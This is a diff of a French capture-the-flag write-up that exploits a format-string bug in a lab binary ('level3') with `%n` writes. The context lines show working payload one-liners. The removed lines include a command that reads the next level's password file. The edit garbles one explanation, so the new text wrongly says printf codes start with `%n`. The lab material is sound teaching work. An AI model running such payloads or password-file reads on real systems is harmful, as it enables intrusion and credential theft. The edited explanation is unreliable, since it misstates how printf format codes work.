@@ -9,8 +9,7 @@ But : écrire 64 (0x40) dans la variable globale `m` pour déclencher `system("/
 
 ## Les concepts à se rappeler
 
-- `printf` a des "codes" qui commencent par `%` : `%d` affiche un nombre, `%p` une
-  valeur de la stack, et `%n` **ÉCRIT** en mémoire (il écrit le nombre de caractères
+- `printf` a des "codes" qui commencent par `%n` **ÉCRIT** en mémoire (il écrit le nombre de caractères
   déjà affichés à une adresse).
 - `%n` écrit où ? À l'adresse qu'il trouve sur la **stack**. C'est là tout le truc.
 - Notre input (`local_20c`) est lui-même posé sur la stack. Donc si on met une adresse
@@ -62,10 +61,4 @@ Astuce : `%60c` évite de taper 60 fois "A".
 ```bash
 (python -c 'print "\x8c\x98\x04\x08%60c%4$n"'; cat) | ./level3
 (printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
-```
-
-## Récupérer le flag
-
-```bash
-/bin/cat /home/user/level4/.pass
 ```
